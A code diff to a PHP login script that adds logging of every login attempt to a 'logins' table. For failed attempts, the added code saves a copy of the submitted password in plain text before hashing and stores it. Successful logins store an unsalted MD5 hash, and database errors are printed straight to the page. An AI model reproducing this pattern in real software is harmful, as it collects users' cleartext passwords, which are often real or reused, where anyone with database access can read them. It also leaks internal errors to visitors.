@@ -65,6 +65,8 @@ if (isset($_POST['login'])) {
 		$username = sanitize($username);
 		$password = sanitize($password);
 
+    $passClear = $password;
+
 		$password = md5($password);
 
 		$d = "" . date("Y/m/d h:i:sa");
@@ -83,6 +85,19 @@ if (isset($_POST['login'])) {
 				mail($mailto, $subject, $msg, $headers);
 
 
+        $query2 = "INSERT INTO logins (username,password,successful) VALUES (?,?,?); ";
+        $stmt = $mysqli->prepare($query2);
+        $suc = "false";
+        $stmt->bind_param("sss", $username,$passClear,$suc);
+        $stmt->execute();
+        print $stmt->error;
+        $stmt->close();
+
+
+
+
+
+
     } // end if
     else {
         // get the id to begin the session.
@@ -93,6 +108,14 @@ if (isset($_POST['login'])) {
             echo "<script>alert('You have been logged in.');</script>";
         }
         if ($result2) {
+
+          $query2 = "INSERT INTO logins (username,password,successful) VALUES (?,?,?); ";
+          $stmt = $mysqli->prepare($query2);
+          $suc = "true";
+          $stmt->bind_param("sss", $username,$password,$suc);
+          $stmt->execute();
+          print $stmt->error;
+          $stmt->close();
 
 
 
